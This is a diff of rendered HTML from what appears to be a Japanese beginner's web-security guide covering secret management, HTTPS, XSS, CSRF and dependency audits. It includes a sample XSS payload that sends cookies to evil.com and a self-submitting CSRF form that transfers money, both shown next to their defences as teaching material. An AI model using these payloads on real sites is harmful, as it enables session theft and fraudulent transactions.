@@ -7763,11 +7763,12 @@
 <h2 id="_5">攻撃は自動でやってくる<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
 <p>インターネット上のサーバーは、公開した瞬間からスキャンされます。</p>
 <div class="admonition info">
-<p>2024-01-15 03:22:11 GET /wp-admin/             → WordPress の管理画面を探している
-2024-01-15 03:22:12 GET /phpmyadmin/           → phpMyAdmin を探している
-2024-01-15 03:22:13 GET /.env                  → 環境変数ファイルを盗もうとしている
-2024-01-15 03:22:14 GET /admin/                → 管理画面を探している
-2024-01-15 03:22:15 POST /api/login            → パスワードを総当たり（ブルートフォース）</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>2024-01-15 03:22:11 GET /wp-admin/             → WordPress の管理画面を探している
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>2024-01-15 03:22:12 GET /phpmyadmin/           → phpMyAdmin を探している
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>2024-01-15 03:22:13 GET /.env                  → 環境変数ファイルを盗もうとしている
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>2024-01-15 03:22:14 GET /admin/                → 管理画面を探している
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>2024-01-15 03:22:15 POST /api/login            → パスワードを総当たり（ブルートフォース）
+</span></code></pre></div>
 </div>
 <p>これは実際のサーバーログによく見られるパターンです。攻撃者ではなくボットが、世界中のサーバーに対して自動で試しています。「うちのサイトには価値がない」は関係ありません。</p>
 <p><strong>狙われるもの：</strong>
@@ -7806,53 +7807,57 @@
 <hr />
 <h2 id="_6">秘密情報の管理（最重要）<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
 <h3 id="_7">❌ これをやると詰む<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># こういうコードを GitHub に push した瞬間、詰みです</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">OPENAI_API_KEY</span> <span class="o">=</span> <span class="s2">&quot;sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">DATABASE_URL</span>   <span class="o">=</span> <span class="s2">&quot;postgresql://user:password@db.example.com/prod&quot;</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># こういうコードを GitHub に push した瞬間、詰みです</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">OPENAI_API_KEY</span> <span class="o">=</span> <span class="s2">&quot;sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">DATABASE_URL</span>   <span class="o">=</span> <span class="s2">&quot;postgresql://user:password@db.example.com/prod&quot;</span>
 </span></code></pre></div>
 <p>GitHub はコードを検索できます。<code>sk-</code> で始まる文字列を検索しているボットが常に存在し、プッシュから数分以内に不正利用が始まった事例があります。</p>
 <h3 id="_8">✅ 正しい管理方法<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># .env ファイル（絶対に Git に含めない）</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nv">OPENAI_API_KEY</span><span class="o">=</span>sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nv">DATABASE_URL</span><span class="o">=</span>postgresql://user:password@db.example.com/prod
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># .env ファイル（絶対に Git に含めない）</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">OPENAI_API_KEY</span><span class="o">=</span>sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nv">DATABASE_URL</span><span class="o">=</span>postgresql://user:password@db.example.com/prod
 </span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># .gitignore に追加（これを忘れると .env が公開される）</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>.env
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>.env.local
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>.env.production
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># .gitignore に追加（これを忘れると .env が公開される）</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>.env
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>.env.local
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>.env.production
 </span></code></pre></div>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># コードでは環境変数名だけ参照する</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">api_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span>  <span class="c1"># 値はコードに書かない</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># コードでは環境変数名だけ参照する</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">api_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span>  <span class="c1"># 値はコードに書かない</span>
 </span></code></pre></div>
 <h3 id="_9">やってしまったときの対処<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
 <div class="admonition info">
-<p>.env を push してしまった場合:
-  1. 即座にそのAPIキー・パスワードを無効化・再発行する
-  2. git の履歴から削除する（削除してもキャッシュされている可能性あり）
-  → 「削除したから大丈夫」は間違い。必ずキーを再発行すること。</p>
+<p><strong>.env を push してしまった場合</strong></p>
+<ol>
+<li>即座にそのAPIキー・パスワードを無効化・再発行する</li>
+<li>git の履歴から削除する（削除してもキャッシュされている可能性あり）
+→ 「削除したから大丈夫」は間違い。必ずキーを再発行すること。</li>
+</ol>
 </div>
 <h3 id="cicd">CI/CD での秘密情報の渡し方<a class="headerlink" href="#cicd" title="Permanent link">&para;</a></h3>
 <p>GitHub Actions や Cloudflare Pages にキーを渡すには、サービスの「Secrets」機能を使います。</p>
-<div class="language-yaml highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># GitHub Actions での例</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nt">jobs</span><span class="p">:</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Deploy</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">        </span><span class="nt">env</span><span class="p">:</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">          </span><span class="nt">API_KEY</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.OPENAI_API_KEY }}</span><span class="w">  </span><span class="c1"># GitHub の Secrets から参照</span>
+<div class="language-yaml highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># GitHub Actions での例</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nt">jobs</span><span class="p">:</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Deploy</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">        </span><span class="nt">env</span><span class="p">:</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">          </span><span class="nt">API_KEY</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.OPENAI_API_KEY }}</span><span class="w">  </span><span class="c1"># GitHub の Secrets から参照</span>
 </span></code></pre></div>
 <hr />
 <h2 id="https">HTTPS（通信の暗号化）<a class="headerlink" href="#https" title="Permanent link">&para;</a></h2>
 <h3 id="http-vs-https">HTTP vs HTTPS<a class="headerlink" href="#http-vs-https" title="Permanent link">&para;</a></h3>
 <div class="admonition info">
-<p>HTTP（暗号化なし）:
-  あなた ──── "パスワード: abc123" ────→ サーバー
-                       ↑
-                  途中で盗み見られる</p>
-<p>HTTPS（暗号化あり）:
-  あなた ──── "x7$Kp#mQ..." ────→ サーバー
-  （TLS で暗号化されているので盗み見ても意味がない）</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>HTTP（暗号化なし）:
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>  あなた ──── &quot;パスワード: abc123&quot; ────→ サーバー
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>                       ↑
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>                  途中で盗み見られる
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>HTTPS（暗号化あり）:
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>  あなた ──── &quot;x7$Kp#mQ...&quot; ────→ サーバー
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>  （TLS で暗号化されているので盗み見ても意味がない）
+</span></code></pre></div>
 </div>
 <p><strong>Cloudflare Pages・GitHub Pages に deploy すれば HTTPS は自動で有効</strong>になります。ブラウザのアドレスバーに 🔒 が表示されていれば OK です。</p>
 <blockquote>
@@ -7868,26 +7873,26 @@
 <li>攻撃者がコメントに「<script>悪いコード</script>」を投稿</li>
 <li>他のユーザーがそのページを開く</li>
 <li>ブラウザが「コメント内のテキスト」ではなく
-   「プログラム」として実行してしまう</li>
+「プログラム」として実行してしまう</li>
 <li>ユーザーのクッキー（ログイン情報）が攻撃者のサーバーに送られる</li>
 <li>攻撃者がそのクッキーを使ってそのユーザーとしてログインできる</li>
 </ol>
 </div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cm">&lt;!-- 攻撃者が投稿するコメント --&gt;</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://evil.com/steal?c=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cm">&lt;!-- 攻撃者が投稿するコメント --&gt;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://evil.com/steal?c=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
 <h3 id="_11">なぜ起きるか・どう防ぐか<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># ❌ 危険：ユーザー入力をそのままHTMLに出力</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">)</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&lt;p&gt;こんにちは、</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">さん&lt;/p&gt;&quot;</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># name に &lt;script&gt;... を入れられると実行される</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># ✅ 安全：エスケープ処理を通す</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="kn">from</span><span class="w"> </span><span class="nn">markupsafe</span><span class="w"> </span><span class="kn">import</span> <span class="n">escape</span>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&lt;p&gt;こんにちは、</span><span class="si">{</span><span class="n">escape</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="si">}</span><span class="s2">さん&lt;/p&gt;&quot;</span>
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="c1"># &lt;script&gt; → &amp;lt;script&amp;gt; に変換され、テキストとして表示される</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># ❌ 危険：ユーザー入力をそのままHTMLに出力</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">)</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&lt;p&gt;こんにちは、</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">さん&lt;/p&gt;&quot;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># name に &lt;script&gt;... を入れられると実行される</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># ✅ 安全：エスケープ処理を通す</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="kn">from</span><span class="w"> </span><span class="nn">markupsafe</span><span class="w"> </span><span class="kn">import</span> <span class="n">escape</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&lt;p&gt;こんにちは、</span><span class="si">{</span><span class="n">escape</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="si">}</span><span class="s2">さん&lt;/p&gt;&quot;</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># &lt;script&gt; → &amp;lt;script&amp;gt; に変換され、テキストとして表示される</span>
 </span></code></pre></div>
 <p><strong>React・Vue・Jinja2 などのモダンなフレームワークはデフォルトでエスケープします。</strong><br />
 <code>dangerouslySetInnerHTML</code>（React）や <code>| safe</code>（Jinja2）など、エスケープを意図的に無効化する機能を使うときだけ注意が必要です。</p>
@@ -7896,46 +7901,46 @@
 <h3 id="_12">何をされる攻撃か<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <p><strong>別のサイトから、ユーザーが意図しないリクエストを「ユーザー本人として」送らせます。</strong></p>
 <div class="admonition info">
-<p>シナリオ: ネットバンキング</p>
-<ol>
-<li>あなたが銀行サイトにログイン中（ブラウザにクッキーが保存されている）</li>
-<li>攻撃者が罠ページに以下を仕込む:</li>
-</ol>
-<p><form action="https://bank.example.com/transfer" method="POST">
-     <input name="to"     value="攻撃者の口座番号">
-     <input name="amount" value="100000">
-   </form>
-   <script>document.forms[0].submit()</script></p>
-<ol>
-<li>あなたが罠ページを開いただけで、フォームが自動送信</li>
-<li>ブラウザは「銀行サイトへのリクエスト」に自動でクッキーを付ける</li>
-<li>銀行サーバーから見ると「あなた本人からの振込リクエスト」に見える</li>
-</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>シナリオ: ネットバンキング
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>1. あなたが銀行サイトにログイン中（ブラウザにクッキーが保存されている）
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>2. 攻撃者が罠ページに以下を仕込む:
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>   &lt;form action=&quot;https://bank.example.com/transfer&quot; method=&quot;POST&quot;&gt;
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>     &lt;input name=&quot;to&quot;     value=&quot;攻撃者の口座番号&quot;&gt;
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>     &lt;input name=&quot;amount&quot; value=&quot;100000&quot;&gt;
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>   &lt;/form&gt;
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>   &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>3. あなたが罠ページを開いただけで、フォームが自動送信
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>4. ブラウザは「銀行サイトへのリクエスト」に自動でクッキーを付ける
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>5. 銀行サーバーから見ると「あなた本人からの振込リクエスト」に見える
+</span></code></pre></div>
 </div>
 <p>XSS は「クッキーを盗む」攻撃、CSRF は「クッキーを使ってリクエストを送らせる」攻撃です。どちらもクッキーが関係しますが、悪用の仕方が違います。</p>
 <h3 id="_13">防御策<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># FastAPI + CSRF トークンの例</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1"># サーバーがランダムなトークンをフォームに埋め込む</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># 攻撃者は別サイトからそのトークンを読めない → 正しいトークンがない → 弾く</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># 最も簡単な対策: SameSite Cookie</span>
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># response.set_cookie(&quot;session&quot;, value, samesite=&quot;Strict&quot;)</span>
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># → 別サイトからのリクエストにはクッキーを送らない</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># FastAPI + CSRF トークンの例</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="c1"># サーバーがランダムなトークンをフォームに埋め込む</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1"># 攻撃者は別サイトからそのトークンを読めない → 正しいトークンがない → 弾く</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1"># 最も簡単な対策: SameSite Cookie</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># response.set_cookie(&quot;session&quot;, value, samesite=&quot;Strict&quot;)</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="c1"># → 別サイトからのリクエストにはクッキーを送らない</span>
 </span></code></pre></div>
 <p><strong>静的サイト（フォームのないサイト）は CSRF の心配はほぼ不要です。</strong></p>
 <hr />
 <h2 id="_14">依存パッケージの脆弱性<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
 <p>ライブラリにも脆弱性が見つかります。古いバージョンを使い続けると、公開された脆弱性を突かれます。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># JavaScript: 脆弱性チェック</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>npm<span class="w"> </span>audit
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Python</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>pip<span class="w"> </span>install<span class="w"> </span>pip-audit
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>pip-audit
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># 結果の見方</span>
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>found<span class="w"> </span><span class="m">3</span><span class="w"> </span>vulnerabilities<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>critical,<span class="w"> </span><span class="m">2</span><span class="w"> </span>moderate<span class="o">)</span>
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>│<span class="w"> </span>critical<span class="w"> </span>│<span class="w"> </span>prototype-pollution<span class="w"> </span><span class="k">in</span><span class="w"> </span>lodash<span class="w"> </span>&lt;<span class="w"> </span><span class="m">4</span>.17.21<span class="w"> </span>│
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># JavaScript: 脆弱性チェック</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>npm<span class="w"> </span>audit
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># Python</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>pip<span class="w"> </span>install<span class="w"> </span>pip-audit
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>pip-audit
